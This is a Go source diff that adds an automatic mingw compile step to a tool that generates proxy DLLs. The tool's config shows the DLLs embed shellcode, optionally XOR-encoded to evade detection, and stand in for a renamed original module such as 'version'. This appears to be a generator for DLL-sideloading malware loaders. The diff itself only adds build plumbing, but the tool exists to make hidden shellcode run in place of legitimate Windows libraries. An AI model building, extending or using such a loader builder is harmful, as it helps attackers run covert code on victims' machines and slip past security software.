@@ -4,6 +4,7 @@ import (
 	"crypto/rand"
 	"fmt"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strings"
 
@@ -18,6 +19,7 @@ type Config struct {
 	RenameBase  string // e.g. "version_orig" (module name, no .dll)
 	Arch        string // "x64" (default) or "x86"
 	XOR         bool   // XOR-encode the embedded shellcode with a random key
+	Build       bool   // compile the proxy DLL with mingw immediately
 }
 
 // Generate emits proxy.c, <name>.def, and a build script into OutDir.
@@ -78,7 +80,34 @@ func Generate(cfg Config) ([]string, error) {
 		return nil, err
 	}
 
-	return []string{cPath, defPath, buildPath}, nil
+	files := []string{cPath, defPath, buildPath}
+	if cfg.Build {
+		dllPath, err := buildProxy(cfg.OutDir, base, cfg.Arch)
+		if err != nil {
+			return files, err
+		}
+		files = append(files, dllPath)
+	}
+	return files, nil
+}
+
+// buildProxy compiles proxy.c + <name>.def into <name>.dll using mingw.
+func buildProxy(outDir, base, arch string) (string, error) {
+	cc := "x86_64-w64-mingw32-gcc"
+	if arch == "x86" {
+		cc = "i686-w64-mingw32-gcc"
+	}
+	ccPath, err := exec.LookPath(cc)
+	if err != nil {
+		return "", fmt.Errorf("%s not found in PATH: %w", cc, err)
+	}
+	dllPath := filepath.Join(outDir, base+".dll")
+	cmd := exec.Command(ccPath, "-shared", "-o", dllPath, "proxy.c", base+".def")
+	cmd.Dir = outDir
+	if out, err := cmd.CombinedOutput(); err != nil {
+		return "", fmt.Errorf("proxy build failed: %w\n%s", err, out)
+	}
+	return dllPath, nil
 }
 
 func xorEncode(data, key []byte) []byte {
